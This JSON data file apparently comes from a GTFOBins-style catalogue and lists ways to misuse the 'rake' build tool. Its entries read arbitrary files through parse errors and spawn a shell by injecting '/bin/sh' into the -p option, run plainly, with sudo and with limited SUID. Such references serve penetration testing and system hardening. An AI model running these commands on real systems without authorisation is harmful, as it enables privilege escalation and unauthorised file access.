{
  "functions": {
    "file-read": [
      {
        "description": "The file is actually parsed and the first wrong line is returned in an error message.",
        "code": "LFILE=file-to-read\nrake -f $LFILE\n"
      }
    ],
    "shell": [
      {
        
        "code": "rake -p '`/bin/sh 1>&0`'\n"
      }
    ],
    "sudo": [
      {
        
        "code": "sudo rake -p '`/bin/sh 1>&0`'\n"
      }
    ],
    "limited-suid": [
      {
        
        "code": "./rake -p '`/bin/sh 1>&0`'\n"
      }
    ]
  }
}
